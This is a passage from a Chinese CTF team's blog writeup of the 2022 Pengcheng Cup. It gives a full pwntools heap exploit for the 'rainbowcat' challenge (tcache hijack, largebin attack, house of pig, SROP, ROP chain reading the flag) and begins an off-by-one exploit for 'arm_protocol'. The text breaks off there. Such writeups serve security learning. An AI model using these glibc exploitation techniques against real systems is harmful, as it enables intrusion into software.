<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2022 鹏城杯 SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="以下是我们 SU 本次2022 鹏城杯 的 writeup同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:type" content="blog"><meta property="og:title" content="2022 鹏城杯 SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/53642.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="以下是我们 SU 本次2022 鹏城杯 的 writeup同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image1.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image2.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image3.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image4.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image5.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image6.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image7.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image8.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image9.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image10.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image11.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image12.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image13.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image14.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image15.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image16.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image17.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image18.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image19.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image20.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image21.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image22.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image23.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image24.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image25.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image26.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image27.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image28.png"><meta property="og:image" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image29.png"><meta property="article:published_time" content="2022-07-04T09:50:45.000Z"><meta property="article:modified_time" content="2025-07-13T11:43:35.890Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="鹏城杯"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2022-pcb-SU-Writeup/image1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/53642.html"},"headline":"2022 鹏城杯 SU Writeup","image":["https://team-su.github.io/images/2022-pcb-SU-Writeup/image1.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image2.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image3.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image4.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image5.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image6.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image7.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image8.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image9.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image10.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image11.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image12.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image13.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image14.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image15.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image16.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image17.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image18.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image19.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image20.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image21.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image22.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image23.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image24.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image25.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image26.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image27.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image28.png","https://team-su.github.io/images/2022-pcb-SU-Writeup/image29.png"],"datePublished":"2022-07-04T09:50:45.000Z","dateModified":"2025-07-13T11:43:35.890Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"以下是我们 SU 本次2022 鹏城杯 的 writeup同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"}</script><link rel="canonical" href="https://team-su.github.io/posts/53642.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-04T09:50:45.000Z" title="2022/7/4 17:50:45">2022-07-04</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T11:43:35.890Z" title="2025/7/13 19:43:35">2025-07-13</time></span><span class="level-item">an hour read (About 6991 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2022 鹏城杯 SU Writeup</h1><div class="content"><p>以下是我们 SU 本次2022 鹏城杯 的 writeup<br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#x75;&#x65;&#114;&#115;&#x5f;&#120;&#x63;&#116;&#x66;&#64;&#x31;&#x32;&#x36;&#46;&#99;&#111;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
<span id="more"></span>
<hr>
<p>以下是我们 SU 本次2022 鹏城杯 的 writeup<br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#x75;&#101;&#x72;&#115;&#95;&#x78;&#x63;&#116;&#102;&#x40;&#x31;&#x32;&#54;&#46;&#99;&#111;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#pwn">pwn</a><ul>
<li><a href="#rainbowcat">rainbowcat</a></li>
<li><a href="#arm-protocol">arm_protocol</a></li>
<li><a href="#fruitshop">fruitshop</a></li>
</ul>
</li>
<li><a href="#crypto">crypto</a><ul>
<li><a href="#easy-rsa">easy_rsa</a></li>
<li><a href="#baby-rsa">baby_rsa</a></li>
</ul>
</li>
<li><a href="#web">web</a><ul>
<li><a href="#jian-dan-bao-han">简单包含</a></li>
<li><a href="#jian-dan-php">简单php</a></li>
<li><a href="#ez-java">Ez_java</a></li>
<li><a href="#can-u-login">can_u_login</a></li>
<li><a href="#gao-shou-gao-shou-gao-gao-shou">高手高手高高手</a></li>
<li><a href="#easygo">easygo</a></li>
<li><a href="#easysql">easysql</a></li>
<li><a href="#ya-suo-bao">压缩包</a></li>
</ul>
</li>
<li><a href="#misc">misc</a><ul>
<li><a href="#jian-dan-qu-zheng">简单取证</a></li>
<li><a href="#misc-water">Misc_water</a></li>
<li><a href="#what-is-log">what_is_log</a></li>
<li><a href="#babybit">babybit</a></li>
</ul>
</li>
<li><a href="#re">re</a><ul>
<li><a href="#baby-re">baby_re</a></li>
<li><a href="#gocode">gocode</a></li>
<li><a href="#rota">rota</a></li>
<li><a href="#maze">maze</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>


<h2><span id="pwn">pwn</span><a href="#pwn" class="header-anchor"></a></h2><h3><span id="rainbowcat">rainbowcat</span><a href="#rainbowcat" class="header-anchor"></a></h3><p><strong>hijack tcache struct + largebin attack + house of pig + orw</strong>&#96;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;192.168.1.102&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.33.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;get? &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;abandon? &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;one?&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;cat: &quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	new(<span class="number">0</span>); new(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x66</span>):</span><br><span class="line">		new(<span class="number">2</span>)</span><br><span class="line">	free(<span class="number">0</span>); show(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">	key = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)); heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>); free(<span class="number">0</span>); edit(<span class="number">0</span>, p64((heap_base + <span class="number">0x10</span>) ^ key) + p64(<span class="number">0</span>))</span><br><span class="line">	new(<span class="number">0</span>); new(<span class="number">0</span>); edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	</span><br><span class="line">	free(<span class="number">1</span>); edit(<span class="number">1</span>, p64(<span class="number">0</span>)*<span class="number">2</span>); free(<span class="number">1</span>); edit(<span class="number">1</span>, p64(key ^ (heap_base + <span class="number">0x90</span>)) + p64(<span class="number">0</span>))</span><br><span class="line">	new(<span class="number">1</span>); new(<span class="number">1</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">0</span>, p64(<span class="number">3</span>) + p64(<span class="number">0</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x350</span>))</span><br><span class="line">	new(<span class="number">2</span>); edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x780</span>))</span><br><span class="line">	new(<span class="number">2</span>); edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x360</span>))</span><br><span class="line">	new(<span class="number">2</span>); free(<span class="number">2</span>); show(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0c00</span></span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">0</span>, p64(<span class="number">2</span>) + p64(<span class="number">0</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x290</span>))</span><br><span class="line">	new(<span class="number">2</span>); edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x2a0</span>))</span><br><span class="line">	new(<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		free(<span class="number">2</span>); edit(<span class="number">2</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	free(<span class="number">2</span>); new(<span class="number">2</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">0</span>, p64(<span class="number">2</span>) + p64(<span class="number">0</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x7b0</span>))</span><br><span class="line">	new(<span class="number">2</span>); edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x7c0</span>))</span><br><span class="line">	new(<span class="number">2</span>); free(<span class="number">2</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">0</span>, p64(<span class="number">1</span>) + p64(<span class="number">0</span>)); edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x370</span>))</span><br><span class="line">	new(<span class="number">2</span>); edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x20</span>))</span><br><span class="line">	new(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	gadget = libc_base + <span class="number">0x14a0a0</span></span><br><span class="line">	_IO_str_jumps = libc_base + <span class="number">0x1e2560</span></span><br><span class="line">	srop_address = heap_base + <span class="number">0x360</span></span><br><span class="line">	FAKE_IO = heap_base + <span class="number">0x7b0</span></span><br><span class="line">	</span><br><span class="line">	IO = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xffff</span>) + p64(<span class="number">0</span>) + p64(FAKE_IO + <span class="number">0xe0</span>) + p64(FAKE_IO + <span class="number">0xf8</span>)</span><br><span class="line">	IO = IO.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_str_jumps) + p64(<span class="number">0</span>) + p64(srop_address) + p64(gadget)</span><br><span class="line">	edit(<span class="number">0</span>, p64(<span class="number">0xff</span>) + p64(<span class="number">0</span>))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(IO), <span class="number">0x10</span>) :</span><br><span class="line">		edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x7c0</span> + i)); new(<span class="number">2</span>); edit(<span class="number">2</span>, IO[i:i+<span class="number">0x10</span>])</span><br><span class="line">	</span><br><span class="line">	pop_rdi_ret = libc_base + <span class="number">0x121b1d</span>; pop_rsi_ret = libc_base + <span class="number">0x2a4cf</span>; pop_rdx_ret = libc_base + <span class="number">0xc7f32</span></span><br><span class="line">	orw_rop = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(pop_rdi_ret) + p64(free_hook_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(free_hook_addr + <span class="number">0x100</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]) + p64(pop_rdi_ret) + p64(free_hook_addr + <span class="number">0x100</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	</span><br><span class="line">	frame = SigreturnFrame(); frame.rsp = free_hook_addr + <span class="number">8</span>; frame.rdi = <span class="number">0</span>; frame.rsi = free_hook_addr; frame.rdx = <span class="number">0x100</span>; frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span> + p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + <span class="built_in">bytes</span>(frame)[<span class="number">0x28</span>:]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">0x10</span>) :</span><br><span class="line">		edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x360</span> + i)); new(<span class="number">2</span>); edit(<span class="number">2</span>, payload[i:i+<span class="number">0x10</span>])</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x20</span>)); new(<span class="number">2</span>); edit(<span class="number">2</span>, p64(<span class="number">0xffff</span>))</span><br><span class="line">	edit(<span class="number">1</span>, p64(heap_base + <span class="number">0xd0</span>)); new(<span class="number">2</span>); edit(<span class="number">2</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line">	edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>])); new(<span class="number">2</span>)</span><br><span class="line">	p.send(orw_rop)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>


<h3><span id="arm-protocol">arm_protocol</span><a href="#arm-protocol" class="header-anchor"></a></h3><p>绕过md5后是一个菜单，分别有add，show，delete,edit选项，在edit时有off by one，利用off by one可以制造一个heap overlab，再任意地址申请到got表上泄漏libc，最后把puts指针改为system。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">proc=<span class="string">&quot;./arm_protocol&quot;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passcheck</span>(<span class="params">hash_value</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		answer = <span class="string">&#x27;A&#x27;</span></span><br><span class="line">		answer +=<span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> 